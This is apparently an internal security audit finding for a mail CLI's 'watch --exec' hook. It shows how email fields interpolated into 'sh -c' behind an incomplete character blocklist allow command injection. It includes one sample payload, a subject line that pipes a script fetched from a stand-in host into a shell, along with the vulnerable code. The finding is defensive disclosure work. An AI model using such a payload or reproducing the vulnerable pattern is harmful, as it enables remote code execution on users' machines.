# 006 -P1- `watch --exec` interpolates attacker-controlled text into `sh -c`

**Subsystem:** cli (`packages/cli/src/watch.ts`) · **Severity:** HIGH (security) · **Fix class:** CHANGE-CODE

## The defect

`packages/cli/src/watch.ts:182-190` substitutes message fields into a user-supplied template and
runs it through a shell:

```js
const cmd = template
  .replaceAll("{id}", row.id)
  .replaceAll("{from}", shellSafe(from))
  .replaceAll("{subject}", shellSafe(row.subject))
  .replaceAll("{preview}", shellSafe(row.preview.slice(0, 120)));
spawn("sh", ["-c", cmd], { stdio: "inherit" });
```

The only sanitizer is `shellSafe()` (`watch.ts:244-246`), which strips `` ` ``, `$`, `\`, `"`, `'`
— **and nothing else**. `;`, `|`, `&`, `(`, `)`, and newlines all survive.

## Why the blocklist appears to work

Because the documented example happens to **double-quote** the placeholder:

```
docs/cli.md:244 — bullmoose watch --json --exec 'notify-send "{from}: {subject}"'
```

Inside double quotes the stripped characters are the dangerous ones. But the equally natural
unquoted form is exploitable:

```
bullmoose watch --exec 'echo {subject}'
```

with an inbound subject of `x; curl evil.sh|sh` → arbitrary code execution as the user, triggered by
**a stranger sending an email**.

A blocklist whose correctness depends on how the _user_ quoted their template is not a control.

## Secondary defect

`stdio: "inherit"` (`watch.ts:188`) means any output from the hook interleaves with the `--json`
NDJSON stream on stdout — and `docs/cli.md:244`'s own example combines both flags, so the documented
usage corrupts the machine-readable stream.

## Context

This is the "injection pattern" the CLI is explicitly designed around — `--exec` is how an external
agent gets triggered on new mail. It is a feature worth keeping; the delivery mechanism is the bug.
